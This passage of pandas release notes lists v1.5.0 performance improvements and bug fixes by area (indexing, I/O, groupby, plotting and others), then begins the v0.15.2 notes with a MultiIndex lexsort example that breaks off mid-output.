and :meth:`.SeriesGroupBy.transform` for some user-defined DataFrame -> Series functions (:issue:`45387`)\n- Performance improvement in :meth:`DataFrame.duplicated` when subset consists of only one column (:issue:`45236`)\n- Performance improvement in :meth:`.DataFrameGroupBy.diff` and :meth:`.SeriesGroupBy.diff` (:issue:`16706`)\n- Performance improvement in :meth:`.DataFrameGroupBy.transform` and :meth:`.SeriesGroupBy.transform` when broadcasting values for user-defined functions (:issue:`45708`)\n- Performance improvement in :meth:`.DataFrameGroupBy.transform` and :meth:`.SeriesGroupBy.transform` for user-defined functions when only a single group exists (:issue:`44977`)\n- Performance improvement in :meth:`.DataFrameGroupBy.apply` and :meth:`.SeriesGroupBy.apply` when grouping on a non-unique unsorted index (:issue:`46527`)\n- Performance improvement in :meth:`DataFrame.loc` and :meth:`Series.loc` for tuple-based indexing of a :class:`MultiIndex` (:issue:`45681`, :issue:`46040`, :issue:`46330`)\n- Performance improvement in :meth:`.DataFrameGroupBy.var` and :meth:`.SeriesGroupBy.var` with ``ddof`` other than one (:issue:`48152`)\n- Performance improvement in :meth:`DataFrame.to_records` when the index is a :class:`MultiIndex` (:issue:`47263`)\n- Performance improvement in :attr:`MultiIndex.values` when the MultiIndex contains levels of type DatetimeIndex, TimedeltaIndex or ExtensionDtypes (:issue:`46288`)\n- Performance improvement in :func:`merge` when left and/or right are empty (:issue:`45838`)\n- Performance improvement in :meth:`DataFrame.join` when left and/or right are empty (:issue:`46015`)\n- Performance improvement in :meth:`DataFrame.reindex` and :meth:`Series.reindex` when target is a :class:`MultiIndex` (:issue:`46235`)\n- Performance improvement when setting values in a pyarrow backed string array (:issue:`46400`)\n- Performance improvement in :func:`factorize` (:issue:`46109`)\n- Performance improvement in :class:`DataFrame` and :class:`Series` constructors for extension dtype scalars (:issue:`45854`)\n- Performance improvement in :func:`read_excel` when ``nrows`` argument provided (:issue:`32727`)\n- Performance improvement in :meth:`.Styler.to_excel` when applying repeated CSS formats (:issue:`47371`)\n- Performance improvement in :meth:`MultiIndex.is_monotonic_increasing`  (:issue:`47458`)\n- Performance improvement in :class:`BusinessHour` ``str`` and ``repr`` (:issue:`44764`)\n- Performance improvement in datetime arrays string formatting when one of the default strftime formats ``\"%Y-%m-%d %H:%M:%S\"`` or ``\"%Y-%m-%d %H:%M:%S.%f\"`` is used. (:issue:`44764`)\n- Performance improvement in :meth:`Series.to_sql` and :meth:`DataFrame.to_sql` (:class:`SQLiteTable`) when processing time arrays. (:issue:`44764`)\n- Performance improvement to :func:`read_sas` (:issue:`47404`)\n- Performance improvement in ``argmax`` and ``argmin`` for :class:`arrays.SparseArray` (:issue:`34197`)\n\n.. ---------------------------------------------------------------------------\n.. _whatsnew_150.bug_fixes:\n\nBug fixes\n~~~~~~~~~\n\nCategorical\n^^^^^^^^^^^\n- Bug in :meth:`.Categorical.view` not accepting integer dtypes (:issue:`25464`)\n- Bug in :meth:`.CategoricalIndex.union` when the index's categories are integer-dtype and the index contains ``NaN`` values incorrectly raising instead of casting to ``float64`` (:issue:`45362`)\n- Bug in :meth:`concat` when concatenating two (or more) unordered :class:`CategoricalIndex` variables, whose categories are permutations, yields incorrect index values (:issue:`24845`)\n\nDatetimelike\n^^^^^^^^^^^^\n- Bug in :meth:`DataFrame.quantile` with datetime-like dtypes and no rows incorrectly returning ``float64`` dtype instead of retaining datetime-like dtype (:issue:`41544`)\n- Bug in :func:`to_datetime` with sequences of ``np.str_`` objects incorrectly raising (:issue:`32264`)\n- Bug in :class:`Timestamp` construction when passing datetime components as positional arguments and ``tzinfo`` as a keyword argument incorrectly raising (:issue:`31929`)\n- Bug in :meth:`Index.astype` when casting from object dtype to ``timedelta64[ns]`` dtype incorrectly casting ``np.datetime64(\"NaT\")`` values to ``np.timedelta64(\"NaT\")`` instead of raising (:issue:`45722`)\n- Bug in :meth:`.SeriesGroupBy.value_counts` index when passing categorical column (:issue:`44324`)\n- Bug in :meth:`DatetimeIndex.tz_localize` localizing to UTC failing to make a copy of the underlying data (:issue:`46460`)\n- Bug in :meth:`DatetimeIndex.resolution` incorrectly returning \"day\" instead of \"nanosecond\" for nanosecond-resolution indexes (:issue:`46903`)\n- Bug in :class:`Timestamp` with an integer or float value and ``unit=\"Y\"`` or ``unit=\"M\"`` giving slightly-wrong results (:issue:`47266`)\n- Bug in :class:`.DatetimeArray` construction when passed another :class:`.DatetimeArray` and ``freq=None`` incorrectly inferring the freq from the given array (:issue:`47296`)\n- Bug in :func:`to_datetime` where ``OutOfBoundsDatetime`` would be thrown even if ``errors=coerce`` if there were more than 50 rows (:issue:`45319`)\n- Bug when adding a :class:`DateOffset` to a :class:`Series` would not add the ``nanoseconds`` field (:issue:`47856`)\n\nTimedelta\n^^^^^^^^^\n- Bug in :func:`astype_nansafe` astype(\"timedelta64[ns]\") fails when np.nan is included (:issue:`45798`)\n- Bug in constructing a :class:`Timedelta` with a ``np.timedelta64`` object and a ``unit`` sometimes silently overflowing and returning incorrect results instead of raising ``OutOfBoundsTimedelta`` (:issue:`46827`)\n- Bug in constructing a :class:`Timedelta` from a large integer or float with ``unit=\"W\"`` silently overflowing and returning incorrect results instead of raising ``OutOfBoundsTimedelta`` (:issue:`47268`)\n\nTime Zones\n^^^^^^^^^^\n- Bug in :class:`Timestamp` constructor raising when passed a ``ZoneInfo`` tzinfo object (:issue:`46425`)\n\nNumeric\n^^^^^^^\n- Bug in operations with array-likes with ``dtype=\"boolean\"`` and :attr:`NA` incorrectly altering the array in-place (:issue:`45421`)\n- Bug in arithmetic operations with nullable types without :attr:`NA` values not matching the same operation with non-nullable types (:issue:`48223`)\n- Bug in ``floordiv`` when dividing by ``IntegerDtype`` ``0`` would return ``0`` instead of ``inf`` (:issue:`48223`)\n- Bug in division, ``pow`` and ``mod`` operations on array-likes with ``dtype=\"boolean\"`` not being like their ``np.bool_`` counterparts (:issue:`46063`)\n- Bug in multiplying a :class:`Series` with ``IntegerDtype`` or ``FloatingDtype`` by an array-like with ``timedelta64[ns]`` dtype incorrectly raising (:issue:`45622`)\n- Bug in :meth:`mean` where the optional dependency ``bottleneck`` causes precision loss linear in the length of the array. ``bottleneck`` has been disabled for :meth:`mean` improving the loss to log-linear but may result in a performance decrease. (:issue:`42878`)\n\nConversion\n^^^^^^^^^^\n- Bug in :meth:`DataFrame.astype` not preserving subclasses (:issue:`40810`)\n- Bug in constructing a :class:`Series` from a float-containing list or a floating-dtype ndarray-like (e.g. ``dask.Array``) and an integer dtype raising instead of casting like we would with an ``np.ndarray`` (:issue:`40110`)\n- Bug in :meth:`Float64Index.astype` to unsigned integer dtype incorrectly casting to ``np.int64`` dtype (:issue:`45309`)\n- Bug in :meth:`Series.astype` and :meth:`DataFrame.astype` from floating dtype to unsigned integer dtype failing to raise in the presence of negative values (:issue:`45151`)\n- Bug in :func:`array` with ``FloatingDtype`` and values containing float-castable strings incorrectly raising (:issue:`45424`)\n- Bug when comparing string and datetime64ns objects causing ``OverflowError`` exception. (:issue:`45506`)\n- Bug in metaclass of generic abstract dtypes causing :meth:`DataFrame.apply` and :meth:`Series.apply` to raise for the built-in function ``type`` (:issue:`46684`)\n- Bug in :meth:`DataFrame.to_records` returning inconsistent numpy types if the index was a :class:`MultiIndex` (:issue:`47263`)\n- Bug in :meth:`DataFrame.to_dict` for ``orient=\"list\"`` or ``orient=\"index\"`` was not returning native types (:issue:`46751`)\n- Bug in :meth:`DataFrame.apply` that returns a :class:`DataFrame` instead of a :class:`Series` when applied to an empty :class:`DataFrame` and ``axis=1`` (:issue:`39111`)\n- Bug when inferring the dtype from an iterable that is *not* a NumPy ``ndarray`` consisting of all NumPy unsigned integer scalars did not result in an unsigned integer dtype (:issue:`47294`)\n- Bug in :meth:`DataFrame.eval` when pandas objects (e.g. ``'Timestamp'``) were column names (:issue:`44603`)\n\nStrings\n^^^^^^^\n- Bug in :meth:`str.startswith` and :meth:`str.endswith` when using other series as parameter _pat_. Now raises ``TypeError`` (:issue:`3485`)\n- Bug in :meth:`Series.str.zfill` when strings contain leading signs, padding '0' before the sign character rather than after as ``str.zfill`` from standard library (:issue:`20868`)\n\nInterval\n^^^^^^^^\n- Bug in :meth:`IntervalArray.__setitem__` when setting ``np.nan`` into an integer-backed array raising ``ValueError`` instead of ``TypeError`` (:issue:`45484`)\n- Bug in :class:`IntervalDtype` when using datetime64[ns, tz] as a dtype string (:issue:`46999`)\n\nIndexing\n^^^^^^^^\n- Bug in :meth:`DataFrame.iloc` where indexing a single row on a :class:`DataFrame` with a single ExtensionDtype column gave a copy instead of a view on the underlying data (:issue:`45241`)\n- Bug in :meth:`DataFrame.__getitem__` returning copy when :class:`DataFrame` has duplicated columns even if a unique column is selected (:issue:`45316`, :issue:`41062`)\n- Bug in :meth:`Series.align` does not create :class:`MultiIndex` with union of levels when both MultiIndexes intersections are identical (:issue:`45224`)\n- Bug in setting a NA value (``None`` or ``np.nan``) into a :class:`Series` with int-based :class:`IntervalDtype` incorrectly casting to object dtype instead of a float-based :class:`IntervalDtype` (:issue:`45568`)\n- Bug in indexing setting values into an ``ExtensionDtype`` column with ``df.iloc[:, i] = values`` with ``values`` having the same dtype as ``df.iloc[:, i]`` incorrectly inserting a new array instead of setting in-place (:issue:`33457`)\n- Bug in :meth:`Series.__setitem__` with a non-integer :class:`Index` when using an integer key to set a value that cannot be set inplace where a ``ValueError`` was raised instead of casting to a common dtype (:issue:`45070`)\n- Bug in :meth:`DataFrame.loc` not casting ``None`` to ``NA`` when setting value as a list into :class:`DataFrame` (:issue:`47987`)\n- Bug in :meth:`Series.__setitem__` when setting incompatible values into a ``PeriodDtype`` or ``IntervalDtype`` :class:`Series` raising when indexing with a boolean mask but coercing when indexing with otherwise-equivalent indexers; these now consistently coerce, along with :meth:`Series.mask` and :meth:`Series.where` (:issue:`45768`)\n- Bug in :meth:`DataFrame.where` with multiple columns with datetime-like dtypes failing to downcast results consistent with other dtypes (:issue:`45837`)\n- Bug in :func:`isin` upcasting to ``float64`` with unsigned integer dtype and list-like argument without a dtype (:issue:`46485`)\n- Bug in :meth:`Series.loc.__setitem__` and :meth:`Series.loc.__getitem__` not raising when using multiple keys without using a :class:`MultiIndex` (:issue:`13831`)\n- Bug in :meth:`Index.reindex` raising ``AssertionError`` when ``level`` was specified but no :class:`MultiIndex` was given; level is ignored now (:issue:`35132`)\n- Bug when setting a value too large for a :class:`Series` dtype failing to coerce to a common type (:issue:`26049`, :issue:`32878`)\n- Bug in :meth:`loc.__setitem__` treating ``range`` keys as positional instead of label-based (:issue:`45479`)\n- Bug in :meth:`DataFrame.__setitem__` casting extension array dtypes to object when setting with a scalar key and :class:`DataFrame` as value (:issue:`46896`)\n- Bug in :meth:`Series.__setitem__` when setting a scalar to a nullable pandas dtype would not raise a ``TypeError`` if the scalar could not be cast (losslessly) to the nullable type (:issue:`45404`)\n- Bug in :meth:`Series.__setitem__` when setting ``boolean`` dtype values containing ``NA`` incorrectly raising instead of casting to ``boolean`` dtype (:issue:`45462`)\n- Bug in :meth:`Series.loc` raising with boolean indexer containing ``NA`` when :class:`Index` did not match (:issue:`46551`)\n- Bug in :meth:`Series.__setitem__` where setting :attr:`NA` into a numeric-dtype :class:`Series` would incorrectly upcast to object-dtype rather than treating the value as ``np.nan`` (:issue:`44199`)\n- Bug in :meth:`DataFrame.loc` when setting values to a column and right hand side is a dictionary (:issue:`47216`)\n- Bug in :meth:`Series.__setitem__` with ``datetime64[ns]`` dtype, an all-``False`` boolean mask, and an incompatible value incorrectly casting to ``object`` instead of retaining ``datetime64[ns]`` dtype (:issue:`45967`)\n- Bug in :meth:`Index.__getitem__`  raising ``ValueError`` when indexer is from boolean dtype with ``NA`` (:issue:`45806`)\n- Bug in :meth:`Series.__setitem__` losing precision when enlarging :class:`Series` with scalar (:issue:`32346`)\n- Bug in :meth:`Series.mask` with ``inplace=True`` or setting values with a boolean mask with small integer dtypes incorrectly raising (:issue:`45750`)\n- Bug in :meth:`DataFrame.mask` with ``inplace=True`` and ``ExtensionDtype`` columns incorrectly raising (:issue:`45577`)\n- Bug in getting a column from a DataFrame with an object-dtype row index with datetime-like values: the resulting Series now preserves the exact object-dtype Index from the parent DataFrame (:issue:`42950`)\n- Bug in :meth:`DataFrame.__getattribute__` raising ``AttributeError`` if columns have ``\"string\"`` dtype (:issue:`46185`)\n- Bug in :meth:`DataFrame.compare` returning all ``NaN`` column when comparing extension array dtype and numpy dtype (:issue:`44014`)\n- Bug in :meth:`DataFrame.where` setting wrong values with ``\"boolean\"`` mask for numpy dtype (:issue:`44014`)\n- Bug in indexing on a :class:`DatetimeIndex` with a ``np.str_`` key incorrectly raising (:issue:`45580`)\n- Bug in :meth:`CategoricalIndex.get_indexer` when index contains ``NaN`` values, resulting in elements that are in target but not present in the index to be mapped to the index of the NaN element, instead of -1 (:issue:`45361`)\n- Bug in setting large integer values into :class:`Series` with ``float32`` or ``float16`` dtype incorrectly altering these values instead of coercing to ``float64`` dtype (:issue:`45844`)\n- Bug in :meth:`Series.asof` and :meth:`DataFrame.asof` incorrectly casting bool-dtype results to ``float64`` dtype (:issue:`16063`)\n- Bug in :meth:`NDFrame.xs`, :meth:`DataFrame.iterrows`, :meth:`DataFrame.loc` and :meth:`DataFrame.iloc` not always propagating metadata (:issue:`28283`)\n- Bug in :meth:`DataFrame.sum` min_count changes dtype if input contains NaNs (:issue:`46947`)\n- Bug in :class:`IntervalTree` that lead to an infinite recursion. (:issue:`46658`)\n- Bug in :class:`PeriodIndex` raising ``AttributeError`` when indexing on ``NA``, rather than putting ``NaT`` in its place. (:issue:`46673`)\n- Bug in :meth:`DataFrame.at` would allow the modification of multiple columns (:issue:`48296`)\n\nMissing\n^^^^^^^\n- Bug in :meth:`Series.fillna` and :meth:`DataFrame.fillna` with ``downcast`` keyword not being respected in some cases where there are no NA values present (:issue:`45423`)\n- Bug in :meth:`Series.fillna` and :meth:`DataFrame.fillna` with :class:`IntervalDtype` and incompatible value raising instead of casting to a common (usually object) dtype (:issue:`45796`)\n- Bug in :meth:`Series.map` not respecting ``na_action`` argument if mapper is a ``dict`` or :class:`Series` (:issue:`47527`)\n- Bug in :meth:`DataFrame.interpolate` with object-dtype column not returning a copy with ``inplace=False`` (:issue:`45791`)\n- Bug in :meth:`DataFrame.dropna` allows to set both ``how`` and ``thresh`` incompatible arguments (:issue:`46575`)\n- Bug in :meth:`DataFrame.fillna` ignored ``axis`` when :class:`DataFrame` is single block (:issue:`47713`)\n\nMultiIndex\n^^^^^^^^^^\n- Bug in :meth:`DataFrame.loc` returning empty result when slicing a :class:`MultiIndex` with a negative step size and non-null start/stop values (:issue:`46156`)\n- Bug in :meth:`DataFrame.loc` raising when slicing a :class:`MultiIndex` with a negative step size other than -1 (:issue:`46156`)\n- Bug in :meth:`DataFrame.loc` raising when slicing a :class:`MultiIndex` with a negative step size and slicing a non-int labeled index level (:issue:`46156`)\n- Bug in :meth:`Series.to_numpy` where multiindexed Series could not be converted to numpy arrays when an ``na_value`` was supplied (:issue:`45774`)\n- Bug in :class:`MultiIndex.equals` not commutative when only one side has extension array dtype (:issue:`46026`)\n- Bug in :meth:`MultiIndex.from_tuples` cannot construct Index of empty tuples (:issue:`45608`)\n\nI/O\n^^^\n- Bug in :meth:`DataFrame.to_stata` where no error is raised if the :class:`DataFrame` contains ``-np.inf`` (:issue:`45350`)\n- Bug in :func:`read_excel` results in an infinite loop with certain ``skiprows`` callables (:issue:`45585`)\n- Bug in :meth:`DataFrame.info` where a new line at the end of the output is omitted when called on an empty :class:`DataFrame` (:issue:`45494`)\n- Bug in :func:`read_csv` not recognizing line break for ``on_bad_lines=\"warn\"`` for ``engine=\"c\"`` (:issue:`41710`)\n- Bug in :meth:`DataFrame.to_csv` not respecting ``float_format`` for ``Float64`` dtype (:issue:`45991`)\n- Bug in :func:`read_csv` not respecting a specified converter to index columns in all cases (:issue:`40589`)\n- Bug in :func:`read_csv` interpreting second row as :class:`Index` names even when ``index_col=False`` (:issue:`46569`)\n- Bug in :func:`read_parquet` when ``engine=\"pyarrow\"`` which caused partial write to disk when column of unsupported datatype was passed (:issue:`44914`)\n- Bug in :func:`DataFrame.to_excel` and :class:`ExcelWriter` would raise when writing an empty DataFrame to a ``.ods`` file (:issue:`45793`)\n- Bug in :func:`read_csv` ignoring non-existing header row for ``engine=\"python\"`` (:issue:`47400`)\n- Bug in :func:`read_excel` raising uncontrolled ``IndexError`` when ``header`` references non-existing rows (:issue:`43143`)\n- Bug in :func:`read_html` where elements surrounding ``<br>`` were joined without a space between them (:issue:`29528`)\n- Bug in :func:`read_csv` when data is longer than header leading to issues with callables in ``usecols`` expecting strings (:issue:`46997`)\n- Bug in Parquet roundtrip for Interval dtype with ``datetime64[ns]`` subtype (:issue:`45881`)\n- Bug in :func:`read_excel` when reading a ``.ods`` file with newlines between xml elements (:issue:`45598`)\n- Bug in :func:`read_parquet` when ``engine=\"fastparquet\"`` where the file was not closed on error (:issue:`46555`)\n- :meth:`DataFrame.to_html` now excludes the ``border`` attribute from ``<table>`` elements when ``border`` keyword is set to ``False``.\n- Bug in :func:`read_sas` with certain types of compressed SAS7BDAT files (:issue:`35545`)\n- Bug in :func:`read_excel` not forward filling :class:`MultiIndex` when no names were given (:issue:`47487`)\n- Bug in :func:`read_sas` returned ``None`` rather than an empty DataFrame for SAS7BDAT files with zero rows (:issue:`18198`)\n- Bug in :meth:`DataFrame.to_string` using wrong missing value with extension arrays in :class:`MultiIndex` (:issue:`47986`)\n- Bug in :class:`StataWriter` where value labels were always written with default encoding (:issue:`46750`)\n- Bug in :class:`StataWriterUTF8` where some valid characters were removed from variable names (:issue:`47276`)\n- Bug in :meth:`DataFrame.to_excel` when writing an empty dataframe with :class:`MultiIndex` (:issue:`19543`)\n- Bug in :func:`read_sas` with RLE-compressed SAS7BDAT files that contain 0x40 control bytes (:issue:`31243`)\n- Bug in :func:`read_sas` that scrambled column names (:issue:`31243`)\n- Bug in :func:`read_sas` with RLE-compressed SAS7BDAT files that contain 0x00 control bytes (:issue:`47099`)\n- Bug in :func:`read_parquet` with ``use_nullable_dtypes=True`` where ``float64`` dtype was returned instead of nullable ``Float64`` dtype (:issue:`45694`)\n- Bug in :meth:`DataFrame.to_json` where ``PeriodDtype`` would not make the serialization roundtrip when read back with :meth:`read_json` (:issue:`44720`)\n- Bug in :func:`read_xml` when reading XML files with Chinese character tags and would raise ``XMLSyntaxError`` (:issue:`47902`)\n\nPeriod\n^^^^^^\n- Bug in subtraction of :class:`Period` from :class:`.PeriodArray` returning wrong results (:issue:`45999`)\n- Bug in :meth:`Period.strftime` and :meth:`PeriodIndex.strftime`, directives ``%l`` and ``%u`` were giving wrong results (:issue:`46252`)\n- Bug in inferring an incorrect ``freq`` when passing a string to :class:`Period` microseconds that are a multiple of 1000 (:issue:`46811`)\n- Bug in constructing a :class:`Period` from a :class:`Timestamp` or ``np.datetime64`` object with non-zero nanoseconds and ``freq=\"ns\"`` incorrectly truncating the nanoseconds (:issue:`46811`)\n- Bug in adding ``np.timedelta64(\"NaT\", \"ns\")`` to a :class:`Period` with a timedelta-like freq incorrectly raising ``IncompatibleFrequency`` instead of returning ``NaT`` (:issue:`47196`)\n- Bug in adding an array of integers to an array with :class:`PeriodDtype` giving incorrect results when ``dtype.freq.n > 1`` (:issue:`47209`)\n- Bug in subtracting a :class:`Period` from an array with :class:`PeriodDtype` returning incorrect results instead of raising ``OverflowError`` when the operation overflows (:issue:`47538`)\n\nPlotting\n^^^^^^^^\n- Bug in :meth:`DataFrame.plot.barh` that prevented labeling the x-axis and ``xlabel`` updating the y-axis label (:issue:`45144`)\n- Bug in :meth:`DataFrame.plot.box` that prevented labeling the x-axis (:issue:`45463`)\n- Bug in :meth:`DataFrame.boxplot` that prevented passing in ``xlabel`` and ``ylabel`` (:issue:`45463`)\n- Bug in :meth:`DataFrame.boxplot` that prevented specifying ``vert=False`` (:issue:`36918`)\n- Bug in :meth:`DataFrame.plot.scatter` that prevented specifying ``norm`` (:issue:`45809`)\n- Fix showing \"None\" as ylabel in :meth:`Series.plot` when not setting ylabel (:issue:`46129`)\n- Bug in :meth:`DataFrame.plot` that led to xticks and vertical grids being improperly placed when plotting a quarterly series (:issue:`47602`)\n- Bug in :meth:`DataFrame.plot` that prevented setting y-axis label, limits and ticks for a secondary y-axis (:issue:`47753`)\n\nGroupby/resample/rolling\n^^^^^^^^^^^^^^^^^^^^^^^^\n- Bug in :meth:`DataFrame.resample` ignoring ``closed=\"right\"`` on :class:`TimedeltaIndex` (:issue:`45414`)\n- Bug in :meth:`.DataFrameGroupBy.transform` fails when ``func=\"size\"`` and the input DataFrame has multiple columns (:issue:`27469`)\n- Bug in :meth:`.DataFrameGroupBy.size` and :meth:`.DataFrameGroupBy.transform` with ``func=\"size\"`` produced incorrect results when ``axis=1`` (:issue:`45715`)\n- Bug in :meth:`.ExponentialMovingWindow.mean` with ``axis=1`` and ``engine='numba'`` when the :class:`DataFrame` has more columns than rows (:issue:`46086`)\n- Bug when using ``engine=\"numba\"`` would return the same jitted function when modifying ``engine_kwargs`` (:issue:`46086`)\n- Bug in :meth:`.DataFrameGroupBy.transform` fails when ``axis=1`` and ``func`` is ``\"first\"`` or ``\"last\"`` (:issue:`45986`)\n- Bug in :meth:`.DataFrameGroupBy.cumsum` with ``skipna=False`` giving incorrect results (:issue:`46216`)\n- Bug in :meth:`.DataFrameGroupBy.sum`, :meth:`.SeriesGroupBy.sum`, :meth:`.DataFrameGroupBy.prod`, :meth:`.SeriesGroupBy.prod, :meth:`.DataFrameGroupBy.cumsum`, and :meth:`.SeriesGroupBy.cumsum` with integer dtypes losing precision (:issue:`37493`)\n- Bug in :meth:`.DataFrameGroupBy.cumsum` and :meth:`.SeriesGroupBy.cumsum` with ``timedelta64[ns]`` dtype failing to recognize ``NaT`` as a null value (:issue:`46216`)\n- Bug in :meth:`.DataFrameGroupBy.cumsum` and :meth:`.SeriesGroupBy.cumsum` with integer dtypes causing overflows when sum was bigger than maximum of dtype (:issue:`37493`)\n- Bug in :meth:`.DataFrameGroupBy.cummin`, :meth:`.SeriesGroupBy.cummin`, :meth:`.DataFrameGroupBy.cummax` and :meth:`.SeriesGroupBy.cummax` with nullable dtypes incorrectly altering the original data in place (:issue:`46220`)\n- Bug in :meth:`DataFrame.groupby` raising error when ``None`` is in first level of :class:`MultiIndex` (:issue:`47348`)\n- Bug in :meth:`.DataFrameGroupBy.cummax` and :meth:`.SeriesGroupBy.cummax` with ``int64`` dtype with leading value being the smallest possible int64 (:issue:`46382`)\n- Bug in :meth:`.DataFrameGroupBy.cumprod` and :meth:`.SeriesGroupBy.cumprod` ``NaN`` influences calculation in different columns with ``skipna=False`` (:issue:`48064`)\n- Bug in :meth:`.DataFrameGroupBy.max` and :meth:`.SeriesGroupBy.max` with empty groups and ``uint64`` dtype incorrectly raising ``RuntimeError`` (:issue:`46408`)\n- Bug in :meth:`.DataFrameGroupBy.apply` and :meth:`.SeriesGroupBy.apply` would fail when ``func`` was a string and args or kwargs were supplied (:issue:`46479`)\n- Bug in :meth:`SeriesGroupBy.apply` would incorrectly name its result when there was a unique group (:issue:`46369`)\n- Bug in :meth:`.Rolling.sum` and :meth:`.Rolling.mean` would give incorrect result with window of same values (:issue:`42064`, :issue:`46431`)\n- Bug in :meth:`.Rolling.var` and :meth:`.Rolling.std` would give non-zero result with window of same values (:issue:`42064`)\n- Bug in :meth:`.Rolling.skew` and :meth:`.Rolling.kurt` would give NaN with window of same values (:issue:`30993`)\n- Bug in :meth:`.Rolling.var` would segfault calculating weighted variance when window size was larger than data size (:issue:`46760`)\n- Bug in :meth:`Grouper.__repr__` where ``dropna`` was not included. Now it is (:issue:`46754`)\n- Bug in :meth:`DataFrame.rolling` gives ValueError when center=True, axis=1 and win_type is specified (:issue:`46135`)\n- Bug in :meth:`.DataFrameGroupBy.describe` and :meth:`.SeriesGroupBy.describe` produces inconsistent results for empty datasets (:issue:`41575`)\n- Bug in :meth:`DataFrame.resample` reduction methods when used with ``on`` would attempt to aggregate the provided column (:issue:`47079`)\n- Bug in :meth:`DataFrame.groupby` and :meth:`Series.groupby` would not respect ``dropna=False`` when the input DataFrame/Series had a NaN values in a :class:`MultiIndex` (:issue:`46783`)\n- Bug in :meth:`DataFrameGroupBy.resample` raises ``KeyError`` when getting the result from a key list which misses the resample key (:issue:`47362`)\n- Bug in :meth:`DataFrame.groupby` would lose index columns when the DataFrame is empty for transforms, like fillna (:issue:`47787`)\n- Bug in :meth:`DataFrame.groupby` and :meth:`Series.groupby` with ``dropna=False`` and ``sort=False`` would put any null groups at the end instead the order that they are encountered (:issue:`46584`)\n\nReshaping\n^^^^^^^^^\n- Bug in :func:`concat` between a :class:`Series` with integer dtype and another with :class:`CategoricalDtype` with integer categories and containing ``NaN`` values casting to object dtype instead of ``float64`` (:issue:`45359`)\n- Bug in :func:`get_dummies` that selected object and categorical dtypes but not string (:issue:`44965`)\n- Bug in :meth:`DataFrame.align` when aligning a :class:`MultiIndex` to a :class:`Series` with another :class:`MultiIndex` (:issue:`46001`)\n- Bug in concatenation with ``IntegerDtype``, or ``FloatingDtype`` arrays where the resulting dtype did not mirror the behavior of the non-nullable dtypes (:issue:`46379`)\n- Bug in :func:`concat` losing dtype of columns when ``join=\"outer\"`` and ``sort=True`` (:issue:`47329`)\n- Bug in :func:`concat` not sorting the column names when ``None`` is included (:issue:`47331`)\n- Bug in :func:`concat` with identical key leads to error when indexing :class:`MultiIndex` (:issue:`46519`)\n- Bug in :func:`pivot_table` raising ``TypeError`` when ``dropna=True`` and aggregation column has extension array dtype (:issue:`47477`)\n- Bug in :func:`merge` raising error for ``how=\"cross\"`` when using ``FIPS`` mode in ssl library (:issue:`48024`)\n- Bug in :meth:`DataFrame.join` with a list when using suffixes to join DataFrames with duplicate column names (:issue:`46396`)\n- Bug in :meth:`DataFrame.pivot_table` with ``sort=False`` results in sorted index (:issue:`17041`)\n- Bug in :meth:`concat` when ``axis=1`` and ``sort=False`` where the resulting Index was a :class:`Int64Index` instead of a :class:`RangeIndex` (:issue:`46675`)\n- Bug in :meth:`wide_to_long` raises when ``stubnames`` is missing in columns and ``i`` contains string dtype column (:issue:`46044`)\n- Bug in :meth:`DataFrame.join` with categorical index results in unexpected reordering (:issue:`47812`)\n\nSparse\n^^^^^^\n- Bug in :meth:`Series.where` and :meth:`DataFrame.where` with ``SparseDtype`` failing to retain the array's ``fill_value`` (:issue:`45691`)\n- Bug in :meth:`SparseArray.unique` fails to keep original elements order (:issue:`47809`)\n\nExtensionArray\n^^^^^^^^^^^^^^\n- Bug in :meth:`IntegerArray.searchsorted` and :meth:`FloatingArray.searchsorted` returning inconsistent results when acting on ``np.nan`` (:issue:`45255`)\n\nStyler\n^^^^^^\n- Bug when attempting to apply styling functions to an empty DataFrame subset (:issue:`45313`)\n- Bug in :class:`CSSToExcelConverter` leading to ``TypeError`` when border color provided without border style for ``xlsxwriter`` engine (:issue:`42276`)\n- Bug in :meth:`Styler.set_sticky` leading to white text on white background in dark mode (:issue:`46984`)\n- Bug in :meth:`Styler.to_latex` causing ``UnboundLocalError`` when ``clines=\"all;data\"`` and the ``DataFrame`` has no rows. (:issue:`47203`)\n- Bug in :meth:`Styler.to_excel` when using ``vertical-align: middle;`` with ``xlsxwriter`` engine (:issue:`30107`)\n- Bug when applying styles to a DataFrame with boolean column labels (:issue:`47838`)\n\nMetadata\n^^^^^^^^\n- Fixed metadata propagation in :meth:`DataFrame.melt` (:issue:`28283`)\n- Fixed metadata propagation in :meth:`DataFrame.explode` (:issue:`28283`)\n\nOther\n^^^^^\n\n.. ***DO NOT USE THIS SECTION***\n\n- Bug in :func:`.assert_index_equal` with ``names=True`` and ``check_order=False`` not checking names (:issue:`47328`)\n\n.. ---------------------------------------------------------------------------\n.. _whatsnew_150.contributors:\n\nContributors\n~~~~~~~~~~~~\n\n.. contributors:: v1.4.4..v1.5.0\n\n\n.. _whatsnew_0152:\n\nVersion 0.15.2 (December 12, 2014)\n----------------------------------\n\n{{ header }}\n\n\nThis is a minor release from 0.15.1 and includes a large number of bug fixes\nalong with several new features, enhancements, and performance improvements.\nA small number of API changes were necessary to fix existing bugs.\nWe recommend that all users upgrade to this version.\n\n- :ref:`Enhancements <whatsnew_0152.enhancements>`\n- :ref:`API Changes <whatsnew_0152.api>`\n- :ref:`Performance Improvements <whatsnew_0152.performance>`\n- :ref:`Bug Fixes <whatsnew_0152.bug_fixes>`\n\n.. _whatsnew_0152.api:\n\nAPI changes\n~~~~~~~~~~~\n\n- Indexing in ``MultiIndex`` beyond lex-sort depth is now supported, though\n  a lexically sorted index will have a better performance. (:issue:`2646`)\n\n  .. code-block:: ipython\n\n    In [1]: df = pd.DataFrame({'jim':[0, 0, 1, 1],\n       ...:                    'joe':['x', 'x', 'z', 'y'],\n       ...:                    'jolie':np.random.rand(4)}).set_index(['jim', 'joe'])\n       ...:\n\n    In [2]: df\n    Out[2]:\n                jolie\n    jim joe\n    0   x    0.126970\n        x    0.966718\n    1   z    0.260476\n        y    0.897237\n\n    [4 rows x 1 columns]\n\n    In [3]: df.index.lexsort_depth\n    Out[3]: 1\n\n     in prior versions this would raise a KeyError\n     will now show a PerformanceWarning\n    In [4]: df.loc[(1, 'z')]\n    Out[4]:\n                jolie\n    jim joe\n    1   z    0.260476\n\n    [1 rows x 1 columns]\n\n     lexically sorting\n    In [5]: df2 = df.sort_index()\n\n    In [6]: df2\n    Out[6]:\n                jolie\n    jim joe\n    0   x    0.126970\n        x    0.966718\n    1   y    0.897237\n        z    0.260476\n\n    [4 rows x 1 columns]\n\n    In [7]: df2.index.lexsort_depth\n    Out[7]: 2\n\n    In [8]: df2.loc[(1,'z')]\n    Out[8]:\n                jolie\n    jim joe\n   